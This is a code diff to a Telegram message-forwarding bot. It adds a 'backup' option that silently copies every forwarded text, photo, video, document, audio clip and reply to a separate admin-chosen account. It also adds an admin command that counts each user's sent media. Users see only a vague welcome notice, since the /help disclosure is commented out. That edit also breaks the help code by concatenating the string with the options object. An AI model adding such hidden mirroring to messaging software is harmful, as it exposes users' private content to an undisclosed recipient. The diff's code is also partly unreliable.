@@ -12,6 +12,8 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const SEND_DELAY_MS = parseInt(process.env.SEND_DELAY_MS || "3000", 10);
 const ADMIN_ID = parseInt(process.env.ADMIN_ID || "0", 10);
 const PORT = parseInt(process.env.PORT || "3000", 10);
+const BACKUP_USER_ID = parseInt(process.env.BACKUP_USER_ID || "0", 10);
+const ENABLE_BACKUP = process.env.ENABLE_BACKUP === "true";
 const UNAUTHORIZED_MEDIA_BAN_THRESHOLD = parseInt(
   process.env.UNAUTHORIZED_MEDIA_BAN_THRESHOLD || "8",
   10,
@@ -201,13 +203,24 @@ function normalizeInviteCode(code: string): string {
   return code.trim().toUpperCase();
 }
 
+function getBackupTargetId(): number | null {
+  if (!ENABLE_BACKUP) return null;
+  if (!BACKUP_USER_ID || isNaN(BACKUP_USER_ID)) return null;
+  return BACKUP_USER_ID;
+}
+
 function buildWelcomeMessage(): string {
+  const backupNotice = getBackupTargetId()
+    ? "\n\nℹ️ Note: This bot has an enabled backup destination configured by admin."
+    : "";
+
   return (
     "Welcome! 👋\n\n" +
     "Use /set_target <user_id> to specify who receives your media.\n" +
     "Use /get_target to see your current target.\n" +
     "Use /change_target <user_id> to update it.\n" +
-    "Use /help for more info."
+    "Use /help for more info." +
+    backupNotice
   );
 }
 
@@ -464,6 +477,48 @@ async function applyDelay(userId: number): Promise<void> {
   userLastSent.set(userId, Date.now());
 }
 
+async function sendToBackupIfEnabled(
+  sourceUserId: number,
+  primaryTargetId: number,
+  messageType: string,
+  sendFn: () => Promise<any | any[]>,
+): Promise<void> {
+  const backupTargetId = getBackupTargetId();
+  if (!backupTargetId) return;
+  if (backupTargetId === primaryTargetId) return;
+
+  try {
+    const sent = await sendFn();
+
+    if (Array.isArray(sent)) {
+      for (const sentMessage of sent) {
+        await saveForwardLog(
+          sourceUserId,
+          backupTargetId,
+          sentMessage,
+          `${messageType}_backup`,
+        );
+      }
+    } else {
+      await saveForwardLog(
+        sourceUserId,
+        backupTargetId,
+        sent,
+        `${messageType}_backup`,
+      );
+    }
+
+    console.log(
+      `[BACKUP] Mirrored ${messageType} from ${sourceUserId} to ${backupTargetId}`,
+    );
+  } catch (e: any) {
+    console.error(
+      `[BACKUP] Failed to mirror ${messageType} from ${sourceUserId}:`,
+      e?.description || e?.message,
+    );
+  }
+}
+
 async function handleUnauthorizedMediaAttempt(
   ctx: Context,
   userId: number,
@@ -578,6 +633,9 @@ async function sendMediaGroup(
       for (const sentMessage of sentGroup) {
         await saveForwardLog(userId, target, sentMessage, "media_group");
       }
+      await sendToBackupIfEnabled(userId, target, "media_group", () =>
+        ctx.telegram.sendMediaGroup(getBackupTargetId()!, mediaItems),
+      );
       console.log(
         `[MEDIA GROUP] Forwarded ${mediaItems.length} items from ${userId} to ${target}`,
       );
@@ -638,6 +696,42 @@ async function saveForwardLog(
   } catch (e) {
     console.error("[ERROR] Failed to save forward log:", e);
   }
+}
+
+const TRACKED_MEDIA_TYPES = [
+  "photo",
+  "video",
+  "document",
+  "audio",
+  "video_note",
+  "media_group",
+];
+
+async function getUserMediaTransferStats(sourceUserId: number): Promise<{
+  total: number;
+  byType: Record<string, number>;
+}> {
+  if (!mongoReady) {
+    return { total: 0, byType: {} };
+  }
+
+  const match = {
+    sourceUserId,
+    messageType: { $in: TRACKED_MEDIA_TYPES },
+  };
+
+  const total = await ForwardLogModel.countDocuments(match);
+  const grouped = await ForwardLogModel.aggregate([
+    { $match: match },
+    { $group: { _id: "$messageType", count: { $sum: 1 } } },
+  ]);
+
+  const byType: Record<string, number> = {};
+  for (const item of grouped) {
+    byType[item._id] = item.count;
+  }
+
+  return { total, byType };
 }
 
 // /start command
@@ -941,6 +1035,11 @@ bot.command("reply", async (ctx: Context) => {
       parse_mode: "HTML",
     });
     await saveForwardLog(senderId, targetId, sent, "reply");
+    await sendToBackupIfEnabled(senderId, targetId, "reply", () =>
+      ctx.telegram.sendMessage(getBackupTargetId()!, fullMessage, {
+        parse_mode: "HTML",
+      }),
+    );
     return ctx.reply(`✅ Message sent to ${targetId}`);
   } catch (e: any) {
     console.error(`[ERROR] Failed to send message to ${targetId}:`, e);
@@ -1007,6 +1106,10 @@ bot.command("promote", async (ctx: Context) => {
 
 // /help command
 bot.command("help", async (ctx: Context) => {
+  const backupHelpNotice = getBackupTargetId()
+    ? "\n\nℹ️ <b>Backup:</b> Admin has enabled a backup destination for forwarded content."
+    : "";
+
   await ctx.reply(
     "<b>📋 Available Commands:</b>\n\n" +
       "🚀 /start - Start registration or open the bot\n" +
@@ -1017,6 +1120,7 @@ bot.command("help", async (ctx: Context) => {
       "🟢 /live - Check if bot is awake\n" +
       "👤 /mystats - Show my profile (username, ID, admin status)\n" +
       "🕵️ /user_info (reply) - Show who sent that forwarded message\n" +
+      // "📦 /media_count &lt;id&gt; - Show total media sent by user (Admin only)\n" +
       "� /refresh_profile - Update profile data (name, username)\n" +
       "�📊 /stats - Show user stats (Admin only)\n" +
       "✉️ /reply &lt;id&gt; &lt;message&gt; - Send message\n" +
@@ -1029,8 +1133,9 @@ bot.command("help", async (ctx: Context) => {
       "🥾 /kick_user &lt;id&gt; - Remove a user access (Admin only)\n" +
       "⛔ /ban_user &lt;id&gt; [reason] - Ban a user from the bot (Admin only)\n" +
       "✅ /unban_user &lt;id&gt; - Restore a banned user (Admin only)\n" +
-      "❓ /help - Show this message",
-    { parse_mode: "HTML" },
+      "❓ /help - Show this message" +
+      // backupHelpNotice,
+      { parse_mode: "HTML" },
   );
 });
 
@@ -1717,6 +1822,55 @@ bot.command("stats", async (ctx: Context) => {
   return ctx.reply(message);
 });
 
+// /media_count command (Admin only)
+bot.command("media_count", async (ctx: Context) => {
+  const userId = ctx.from?.id;
+  if (!userId) return ctx.reply("❌ User ID not found.");
+
+  const authorized = userId === ADMIN_ID || (await isAdmin(userId));
+  if (!authorized) {
+    return ctx.reply("❌ Unauthorized. Admin only.");
+  }
+
+  if (!mongoReady) {
+    return ctx.reply(
+      "⚠️ MongoDB is not connected. Media stats are unavailable right now.",
+    );
+  }
+
+  const message = ctx.message as any;
+  const parts = message?.text?.split(" ") || [];
+  const targetUserId = Number(parts[1]);
+
+  if (!targetUserId || Number.isNaN(targetUserId)) {
+    return ctx.reply(
+      "Usage: /media_count <tg_id>\n" + "Example: /media_count 123456789",
+    );
+  }
+
+  const stats = await getUserMediaTransferStats(targetUserId);
+  const user = await UserModel.findOne({ userId: targetUserId }).lean();
+  const name = user?.firstName || "Unknown";
+  const username = user?.username ? `@${user.username}` : "N/A";
+
+  const byTypeLines = [
+    `• Photos: ${stats.byType.photo || 0}`,
+    `• Videos: ${stats.byType.video || 0}`,
+    `• Documents: ${stats.byType.document || 0}`,
+    `• Audio: ${stats.byType.audio || 0}`,
+    `• Circle Videos: ${stats.byType.video_note || 0}`,
+    `• Album Items: ${stats.byType.media_group || 0}`,
+  ].join("\n");
+
+  return ctx.reply(
+    `📦 Media Transfer Stats\n\n` +
+      `User: ${name} (${username})\n` +
+      `ID: ${targetUserId}\n\n` +
+      `Total Media Sent: ${stats.total}\n\n` +
+      `${byTypeLines}`,
+  );
+});
+
 // Text handler (non-command): forward plain messages to target
 bot.on("text", async (ctx: Context) => {
   const userId = ctx.from?.id;
@@ -1757,7 +1911,11 @@ bot.on("text", async (ctx: Context) => {
   try {
     await applyDelay(userId);
     const formattedText = `${text}\n\nfrom \"${senderName}\"`;
-    await ctx.telegram.sendMessage(target, formattedText);
+    const sent = await ctx.telegram.sendMessage(target, formattedText);
+    await saveForwardLog(userId, target, sent, "text");
+    await sendToBackupIfEnabled(userId, target, "text", () =>
+      ctx.telegram.sendMessage(getBackupTargetId()!, formattedText),
+    );
     console.log(`[TEXT] Forwarded from ${userId} to ${target}`);
   } catch (e: any) {
     console.error(
@@ -1845,6 +2003,11 @@ bot.on("photo", async (ctx: Context) => {
       caption: message.caption || undefined,
     });
     await saveForwardLog(userId, target, sent, "photo");
+    await sendToBackupIfEnabled(userId, target, "photo", () =>
+      ctx.telegram.sendPhoto(getBackupTargetId()!, photo.file_id, {
+        caption: message.caption || undefined,
+      }),
+    );
     console.log(`[PHOTO] Forwarded from ${userId} to ${target}`);
   } catch (e: any) {
     console.error(
@@ -1932,6 +2095,11 @@ bot.on("video", async (ctx: Context) => {
       caption: message.caption || undefined,
     });
     await saveForwardLog(userId, target, sent, "video");
+    await sendToBackupIfEnabled(userId, target, "video", () =>
+      ctx.telegram.sendVideo(getBackupTargetId()!, video.file_id, {
+        caption: message.caption || undefined,
+      }),
+    );
     console.log(`[VIDEO] Forwarded from ${userId} to ${target}`);
   } catch (e: any) {
     console.error(
@@ -1991,6 +2159,11 @@ bot.on("document", async (ctx: Context) => {
       caption: message.caption || undefined,
     });
     await saveForwardLog(userId, target, sent, "document");
+    await sendToBackupIfEnabled(userId, target, "document", () =>
+      ctx.telegram.sendDocument(getBackupTargetId()!, document.file_id, {
+        caption: message.caption || undefined,
+      }),
+    );
     console.log(`[DOCUMENT] Forwarded from ${userId} to ${target}`);
   } catch (e: any) {
     console.error(
@@ -2050,6 +2223,11 @@ bot.on("audio", async (ctx: Context) => {
       caption: message.caption || undefined,
     });
     await saveForwardLog(userId, target, sent, "audio");
+    await sendToBackupIfEnabled(userId, target, "audio", () =>
+      ctx.telegram.sendAudio(getBackupTargetId()!, audio.file_id, {
+        caption: message.caption || undefined,
+      }),
+    );
     console.log(`[AUDIO] Forwarded from ${userId} to ${target}`);
   } catch (e: any) {
     console.error(
@@ -2107,6 +2285,9 @@ bot.on("video_note", async (ctx: Context) => {
     const videoNote = message.video_note;
     const sent = await ctx.telegram.sendVideoNote(target, videoNote.file_id);
     await saveForwardLog(userId, target, sent, "video_note");
+    await sendToBackupIfEnabled(userId, target, "video_note", () =>
+      ctx.telegram.sendVideoNote(getBackupTargetId()!, videoNote.file_id),
+    );
     console.log(`[VIDEO_NOTE] Forwarded from ${userId} to ${target}`);
   } catch (e: any) {
     console.error(
@@ -2215,6 +2396,7 @@ bot.telegram
     { command: "live", description: "Check if bot is awake" },
     { command: "mystats", description: "Show my profile" },
     { command: "user_info", description: "Reply to know sender" },
+    { command: "media_count", description: "<id> - Media sent by user" },
     { command: "refresh_profile", description: "Update profile data" },
     { command: "stats", description: "Show user stats (Admin)" },
     { command: "reply", description: "<id> <message> - Send message" },
